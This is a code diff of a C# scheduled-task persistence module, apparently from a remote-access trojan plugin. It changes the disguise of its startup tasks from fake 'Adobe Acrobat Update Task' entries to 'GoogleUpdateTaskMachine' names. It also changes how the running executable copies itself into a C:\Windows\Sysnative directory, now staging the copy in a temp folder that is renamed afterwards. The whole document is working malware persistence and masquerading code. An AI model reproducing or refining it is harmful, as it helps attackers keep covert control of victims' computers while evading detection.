@@ -1,4 +1,5 @@
-﻿using Microsoft.Win32;
+﻿using Microsoft.VisualBasic.Devices;
+using Microsoft.Win32;
 using Microsoft.Win32.TaskScheduler;
 using System;
 using System.Collections.Generic;
@@ -16,10 +17,10 @@ namespace Plugin.Handler
 {
     class HandleSchtask
     {
-        public static string Author = "Adobe Scheduler";
-        public static string Description = "This task keeps your Adobe Reader and Acrobat applications up to date with the latest enhancements and security fixes";
-        public static string Task = "Adobe Acrobat Update Task";
-        public static string TaskAdmin = "Adobe Acrobat Update Task For Admin";
+        public static string Author = "";
+        public static string Description = "";
+        public static string Task = "GoogleUpdateTaskMachine";
+        public static string TaskAdmin = "GoogleUpdateTaskMachineAdmin";
         public static void AddStartUp()
         {
             try
@@ -32,10 +33,8 @@ namespace Plugin.Handler
                     try
                     {
                         filepath = Path.Combine(@"C:\Windows\Sysnative", name);
-                        if (!Directory.Exists(@"C:\Windows\Sysnative")) 
-                        {
-                            Directory.CreateDirectory(@"C:\Windows\Sysnative");
-                        }
+                        if (Directory.Exists(@"C:\Windows\Sysnative"))
+                            Directory.Delete(@"C:\Windows\Sysnative");
                         FileInfo installPath = new FileInfo(filepath);
                         if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
                         {
@@ -49,7 +48,11 @@ namespace Plugin.Handler
                                 catch { }
                             }
                         }
-                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                        if (!Directory.Exists(@"C:\Windows\Sysnativetemp"))
+                            Directory.CreateDirectory(@"C:\Windows\Sysnativetemp");
+                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(@"C:\Windows\Sysnativetemp", name), true);
+                        Computer MyComputer = new Computer();
+                        MyComputer.FileSystem.RenameDirectory(@"C:\Windows\Sysnativetemp", "Sysnative");
                     }
                     catch
                     {
